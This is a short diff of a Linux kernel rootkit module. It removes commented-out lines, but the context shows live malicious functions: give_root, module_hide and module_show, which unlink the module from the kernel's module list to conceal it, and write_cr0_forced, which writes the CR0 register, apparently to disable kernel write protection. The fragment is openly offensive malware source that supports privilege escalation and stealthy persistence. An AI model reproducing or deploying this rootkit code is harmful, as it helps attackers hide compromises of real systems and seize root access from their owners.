@@ -269,15 +269,8 @@ give_root(void)
 static inline void
 tidy(void)
 {
-//	kfree(THIS_MODULE->notes_attrs);
-//	THIS_MODULE->notes_attrs = NULL;
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
-//	kfree(THIS_MODULE->mkobj.mp);
-//	THIS_MODULE->mkobj.mp = NULL;
-//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
-//	kfree(THIS_MODULE->mkobj.drivers_dir);
-//	THIS_MODULE->mkobj.drivers_dir = NULL;
 }
 
 static struct list_head *module_previous;
@@ -286,8 +279,6 @@ void
 module_show(void)
 {
 	list_add(&THIS_MODULE->list, module_previous);
-	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
-	//			MODULE_NAME);
 	module_hidden = 0;
 }
 
@@ -296,8 +287,6 @@ module_hide(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	//kobject_del(&THIS_MODULE->mkobj.kobj);
-	//list_del(&THIS_MODULE->mkobj.kobj.entry);
 	module_hidden = 1;
 }
 
@@ -347,7 +336,6 @@ write_cr0_forced(unsigned long val)
 {
 	unsigned long __force_order;
 
-	/* __asm__ __volatile__( */
 	asm volatile(
 		"mov %0, %%cr0"
 		: "+r"(val), "+m"(__force_order));
